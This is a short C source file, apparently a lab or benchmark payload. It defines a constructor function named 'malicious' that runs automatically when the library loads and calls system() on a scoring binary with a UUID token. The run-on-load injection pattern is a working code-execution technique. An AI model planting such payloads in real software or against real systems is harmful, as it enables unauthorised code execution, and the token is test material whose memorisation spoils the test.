#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score 25fd2232-ae17-491b-9e04-cc306372b47c");
}
